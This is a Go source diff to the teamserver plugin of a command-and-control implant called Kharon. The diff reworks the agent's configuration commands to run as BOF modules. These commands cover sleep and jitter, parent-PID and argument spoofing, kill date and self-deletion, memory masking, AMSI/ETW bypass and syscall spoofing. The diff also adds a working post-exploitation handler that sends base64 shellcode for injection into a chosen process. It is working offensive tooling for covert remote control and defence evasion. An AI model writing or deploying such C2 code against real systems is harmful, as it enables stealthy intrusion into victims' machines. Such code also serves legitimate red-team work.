@@ -1561,6 +1561,12 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		}
 
 	case "config":
+
+		bofData, err := LoadExtModule("config", "x64")
+		if err != nil {
+			goto RET
+		}
+
 		switch subcommand {
 
 		case "sleep":
@@ -1585,13 +1591,18 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_SLEEP, sleepTime}
-
 			agent.Sleep = uint(sleepTime)
+			kharon_cfg.session.sleep_time = uint32(sleepTime * 1000)
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			_ = ts.TsAgentUpdateData(agent)
 
-			kharon_cfg.session.sleep_time = uint32(sleepTime * 1000)
-			agent.CustomData, _ = kharon_cfg.Marshal()	
+			bofParam, err := PackExtData(
+				int(CONFIG_SLEEP),
+				int(sleepTime),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "jitter":
 			jitter, jitterOk := args["val"].(float64)
@@ -1613,7 +1624,15 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			_ = ts.TsAgentUpdateData(agent)
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_JITTER, jitterTime}
+			bofParam, err := PackExtData(
+				int(CONFIG_JITTER),
+				int(jitterTime),
+			)
+			if err != nil {
+				goto RET
+			}
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "ppid":
 			pid, ok := args["pid"].(float64)
@@ -1623,23 +1642,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 			
 			kharon_cfg.ps.parent_id = uint32(pid)
-						
-			// serialize kharon config data
+			
 			NewCustomData, err := kharon_cfg.Marshal()
 			if err != nil {
 				goto RET
 			}
 
-			// passing custom data to agent.CustomData
 			agent.CustomData = NewCustomData
-	
-			// update agent data
+
 			err = ts.TsAgentUpdateData(agent)
 			if err != nil {
 				goto RET
 			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_PPID, int(pid)}
+			bofParam, err := PackExtData(
+				int(CONFIG_PPID),
+				int(pid),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "argue":
 			argument, ok := args["argument"].(string)
 			if !ok {
@@ -1648,9 +1670,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.ps.spoofarg = argument
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_ARGUE, ConvertCpToUTF16(argument, agent.ACP)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_ARGUE),
+				PackExtDataWChar(argument, agent.ACP),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "killdate.date":
 			dt, ok := args["date"].(string)
 			if !ok {
@@ -1664,9 +1703,27 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.killdate.date = parsedDate
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_DATE, int(parsedDate.Year()), int(parsedDate.Month()), int(parsedDate.Day())}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_KD_DATE),
+				int(int(parsedDate.Year())),
+				int(int(parsedDate.Month())),
+				int(int(parsedDate.Day())),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "killdate.selfdel":
 			status, ok := args["status"].(string)
@@ -1687,9 +1744,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.killdate.selfdel = enabled != 0
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_SELFDEL, int(enabled)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_KD_SELFDEL),
+				int(enabled),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "killdate.exit":
 			method, ok := args["method"].(string)
 			if !ok {
@@ -1709,9 +1783,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.killdate.exit = enabled != 0
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_EXIT, int(enabled)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_KD_EXIT),
+				int(enabled),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "mask.beacon":
 			tp, ok := args["type"].(string)
 			if !ok {
@@ -1731,9 +1822,25 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.mask.beacon = uint32(num)
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_MASK, int(num)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_MASK),
+				int(num),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "mask.heap":
 			status, ok := args["status"].(string)
@@ -1754,9 +1861,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 			
 			kharon_cfg.mask.heap = enabled != 0
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_MASK_HEAP, int(enabled)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_MASK_HEAP),
+				int(enabled),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "spawnto":
 			spawnto, ok := args["spawnto"].(string)
 			if !ok {
@@ -1765,9 +1889,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.ps.spawnto = spawnto
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_SPAWN, ConvertCpToUTF16(spawnto, agent.ACP)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_SPAWN),
+				PackExtDataWChar(spawnto, agent.ACP),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "blockdlls":
 			status, ok := args["status"].(string)
 			if !ok {
@@ -1787,12 +1928,27 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			kharon_cfg.ps.block_dlls = enabled != 0
-			agent.CustomData, _ = kharon_cfg.Marshal()
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_BLOCK_DLLS, int(enabled)}
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
+
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_BLOCK_DLLS),
+				int(enabled),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "amsi_etw_bypass":
-			
 			bypass, ok := args["bypass"].(string)
 			if !ok {
 				err = errors.New("parameter 'bypass' must be set")
@@ -1815,9 +1971,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 	
 			kharon_cfg.evasion.amsi_etw_bypass = int32(bypass_n)
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_AE_BYPASS, int(bypass_n)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_AE_BYPASS),
+				int(bypass_n),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "syscall":
 			syscall, ok := args["syscall"].(string)
 			if !ok {
@@ -1827,42 +2000,100 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			syscall_n := 0
 
-			if syscall == "spoof" {
+			switch syscall {
+			case "spoof":
 				syscall_n = 1
-			} else if syscall == "spoof_indirect" {
+			case "spoof_indirect":
 				syscall_n = 2
-			} else if syscall == "none" {
+			case "none":
 				syscall_n = 0
-			} else {
+			default:
 				err = errors.New("Unknown syscall method. Syscall must be 'spoof', 'spoof_indirect' or 'none'")
+				goto RET
 			}
 
 			kharon_cfg.evasion.syscall = uint32(syscall_n)
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_SYSCALL, int(syscall_n)}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_SYSCALL),
+				int(syscall_n),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		case "fork_pipe_name":
-			forkPipeName := args["name"].(string)
+			forkPipeName, ok := args["name"].(string)
 			if !ok {
 				err = errors.New("parameter 'name' must be set")
 				goto RET
 			}
 
 			kharon_cfg.ps.fork_pipe = forkPipeName
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_FORKPIPE, forkPipeName}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_FORKPIPE),
+				PackExtDataWChar(forkPipeName, agent.ACP),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "bofproxy":
 			status, ok := args["status"].(bool)
 			if !ok {
 				err = errors.New("parameter 'status' must be set")
+				goto RET
+			}
+
+			enabled := 0
+			if status {
+				enabled = 1
 			}
 
 			kharon_cfg.evasion.bof_proxy = status
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_BOFPROXY, status}
+			agent.CustomData = NewCustomData
+
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				int(CONFIG_BOFPROXY),
+				int(enabled),
+			)
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
+
 		default:
 			err = errors.New("invalid sub command")
 			goto RET
@@ -1942,90 +2173,39 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, cmdId, len(params), params}
 		case "postex":
-			// taskData.Type = TYPE_JOB
+			method := args["method"].(string)
+			pid := args["pid"].(int)
+			scfile := args["shellcode"].(string)
 
-			// method, ok := args["method"].(string)
-			// if !ok {
-			// 	err = errors.New("parameter 'method' must be set")
-			// 	goto RET
-			// }
+			method_n := 0
+			switch method {
+			case "explicit":
+				method_n = 0x100
+			case "spawn":
+				method_n = 0x200
+			}
 
-			// fork_type_n := 0
+			scContent, _ := base64.StdEncoding.DecodeString(scfile)
 
-			// if method != "inline" && method != "fork" {
-			// 	err = errors.New("parameter 'method' must be 'inline' or 'fork'")
-			// 	goto RET
-			// }
+			var bofData []byte
+			if !kharon_cfg.postex_handler.PostexLoaded {  
+				bofData, _ = LoadExtModule("kit_postex", "x64")
+			}
 
-			// method_n := 0x15
+			bofArgs, _ := PackExtData(
+				int(method_n),
+				int(pid),
+				len(scContent),
+				scContent,
+			)
 
-			// if method == "inline" {
-			// 	method_n = 0x15
-			// } else if method == "fork" {
-			// 	method_n = 0x20
+			array = []interface{}{ TASK_POSTEX, 1, len(bofData), bofData, len(bofArgs), bofArgs,}
 
-			// 	fork_type, ok_1 := args["fork_type"].(string)
-			// 	if !ok_1 {
-			// 		err = errors.New("parameter 'fork_type' must be set")
-			// 		goto RET
-			// 	}
+			// case "kill": id := args["id"].(int) array = []interface{}{TASK_POSTEX, POSTEX_KILL, PackInt32(id)}
 
-			// 	if fork_type == "explicit" {
-			// 		fork_type_n = 0x100
-			// 	} else if fork_type == "spawn" {
-			// 		fork_type_n = 0x200
-			// 	}
-			// }
+			// case "list": array = []interface{}{TASK_POSTEX, POSTEX_LIST}
 
-			// scFile, ok := args["sc_file"].(string)
-			// if !ok {
-			// 	err = errors.New("parameter 'sc_file' must be set")
-			// 	goto RET
-			// }
-
-			// explicitPid := 0
-			// if pidVal, ok := args["pid"]; ok {
-			// 	if pidInt, ok := pidVal.(int); ok {
-			// 		explicitPid = pidInt
-			// 	} else {
-			// 		if pidFloat, ok := pidVal.(float64); ok {
-			// 			explicitPid = int(pidFloat)
-			// 		}
-			// 	}
-			// } else {
-			// 	fmt.Printf("[DEBUG] pid arg does NOT exist in args map\n")
-			// }
-
-			// scContent, err := base64.StdEncoding.DecodeString(scFile)
-			// if err != nil {
-			// 	goto RET
-			// }
-
-			// var params []byte
-			// paramData, ok := args["param_data"].(string)
-			// if ok {
-			// 	params, err = base64.StdEncoding.DecodeString(paramData)
-			// 	if err != nil {
-			// 		params = []byte(paramData)
-			// 	}
-			// }
-
-			// parent_id_spoof := kharon_cfg.ps.parent_id
-			// block_dlls      :=  kharon_cfg.ps.block_dlls
-
-			// bofData, err := LoadExtModule( "sc_postex", "x64")
-			// if err != nil {
-			// 	goto RET
-			// }
-
-			// bofParam, err := PackExtData(
-
-			// )
-
-			// array = []interface{}{TASK_EXEC_BOF, int(explicitPid), len(scContent), scContent, len(params), params}
-		default:
-			err = errors.New("subcommand for 'execute': 'bof', 'postex'")
-			goto RET
+			// case "cleanup": array = []interface{}{TASK_POSTEX, POSTEX_CLEANUP}
 		}
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
@@ -2048,6 +2228,13 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 	var outTasks []ax.TaskData
 
 	/// START CODE
+	var kharon_cfg KharonData
+	
+	err := kharon_cfg.Unmarshal(agentData.CustomData)
+	if err != nil {
+		fmt.Printf("ERROR: %v\n", err)
+		return outTasks
+	}
 
 	packer := CreatePacker( packedData )
 
@@ -2399,10 +2586,16 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 					}
 					break
 
-				case TASK_CONFIG:
-					task.Message = "Configuration changed\n"
-					break
+				case TASK_POSTEX:
+					success := cmd_packer.ParseInt32()
+					if success == 1 {
+						kharon_cfg.postex_handler.PostexLoaded = true
+					} else {
+						kharon_cfg.postex_handler.PostexLoaded = false
+					}
 
+					agentData.CustomData, _ = kharon_cfg.Marshal()
+					ts.TsAgentUpdateData(agentData)
 
 				case TASK_EXEC_BOF:
 					cmd_id := cmd_packer.ParseInt32()
@@ -2663,6 +2856,20 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									task.ClearText = ps_output
 								}
 							}
+						case TASK_CONFIG: {
+							exit_code := uint(0)
+							if cmd_packer.CheckPacker([]string{"int"}) {
+								exit_code = cmd_packer.ParseInt32()
+							}
+
+							if exit_code == 0 {
+								taskData.Message = "Config ended with success"
+							} else {
+								taskData.Message = fmt.Sprintf("Config ended with error") 
+							}
+							
+							taskData.Completed = true
+						}
 						// case DOTNET_INLINE:
 						// case DOTNET_FORK:		
 						// case REFLECT_INLINE:					
@@ -2897,3 +3104,4 @@ func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
 func TerminalClose(terminalId int) ([]byte, error) {
 	return nil, errors.New("Function Remote Terminal not supported")
 }
+ 
